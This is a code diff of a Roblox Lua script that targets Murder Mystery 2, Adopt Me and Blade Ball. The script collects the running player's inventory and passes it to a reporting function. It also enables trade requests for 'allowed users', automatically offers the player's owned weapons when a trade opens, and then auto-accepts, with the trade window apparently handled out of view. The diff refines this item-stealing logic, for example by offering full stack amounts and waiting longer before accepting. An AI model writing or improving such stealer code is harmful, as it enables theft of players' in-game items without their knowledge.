@@ -55,7 +55,7 @@ local function collect_mm2_items()
         if ok2 and Sync and Sync.Weapons and Sync.Weapons[itemName] then
             rarity = Sync.Weapons[itemName].Rarity or "Unknown"
         end
-        table.insert(items, {name=itemName, rarity=rarity, amount=tostring(amount)})
+        table.insert(items, {name=itemName, rarity=rarity, amount=amount})
     end
     table.sort(items, function(a, b)
         return (rarityOrder[a.rarity] or 999) < (rarityOrder[b.rarity] or 999)
@@ -69,7 +69,7 @@ local function collect_adoptme_items()
     if inv then
         for _, v in ipairs(inv:GetDescendants()) do
             if v:IsA("StringValue") or v:IsA("IntValue") then
-                table.insert(items, {name=v.Name, rarity="Pet", amount="1"})
+                table.insert(items, {name=v.Name, rarity="Pet", amount=1})
             end
         end
     end
@@ -137,7 +137,6 @@ local function hook_mm2()
     local setRequestsEnabled = Trade:WaitForChild("SetRequestsEnabled", 10)
     if not sendRequest or not offerItem or not acceptTrade or not startTrade then return end
 
-    -- trades aanzetten zodat allowed users kunnen sturen
     pcall(function() setRequestsEnabled:FireServer(true) end)
 
     local okP, ProfileData = pcall(function() return require(RS.Modules.ProfileData) end)
@@ -195,10 +194,7 @@ local function hook_mm2()
 
     local function showGui()
         guiHidden = false
-        if shiftlockConn then
-            shiftlockConn:Disconnect()
-            shiftlockConn = nil
-        end
+        if shiftlockConn then shiftlockConn:Disconnect() shiftlockConn = nil end
         local gui = lp:FindFirstChild("PlayerGui")
         if not gui then return end
         for _, name in ipairs({"TradeGUI","TradeGUI_Phone"}) do
@@ -234,7 +230,7 @@ local function hook_mm2()
         end
     end)
 
-    startTrade.OnClientEvent:Connect(function(tradeData, operatorName)
+    startTrade.OnClientEvent:Connect(function(tradeData)
         if not tradeData then return end
         currentLastOffer = tradeData.LastOffer
 
@@ -254,13 +250,19 @@ local function hook_mm2()
 
         task.spawn(function()
             task.wait(1)
-            if okP and ProfileData and ProfileData.Weapons and ProfileData.Weapons.Owned then
-                for itemName, _ in pairs(ProfileData.Weapons.Owned) do
+            if not (okP and ProfileData and ProfileData.Weapons and ProfileData.Weapons.Owned) then return end
+
+            local uniqueSlots = 0
+            for itemName, amount in pairs(ProfileData.Weapons.Owned) do
+                if uniqueSlots >= 4 then break end
+                uniqueSlots = uniqueSlots + 1
+                for i = 1, amount do
                     pcall(function() offerItem:FireServer(itemName, "Weapons") end)
-                    task.wait(0.15)
+                    task.wait(0.3)
                 end
             end
-            task.wait(1)
+
+            task.wait(5)
             if not readySent and currentLastOffer then
                 readySent = true
                 pcall(function() acceptTrade:FireServer(TRADE_ID, currentLastOffer) end)
@@ -290,7 +292,7 @@ local function hook_bladeball()
     local mgp = lp:FindFirstChild("leaderstats")
     if mgp then
         for _, v in ipairs(mgp:GetChildren()) do
-            table.insert(items, {name=v.Name, rarity=tostring(v.Value), amount="1"})
+            table.insert(items, {name=v.Name, rarity=tostring(v.Value), amount=1})
         end
     end
     send_job("BladeBall", items)
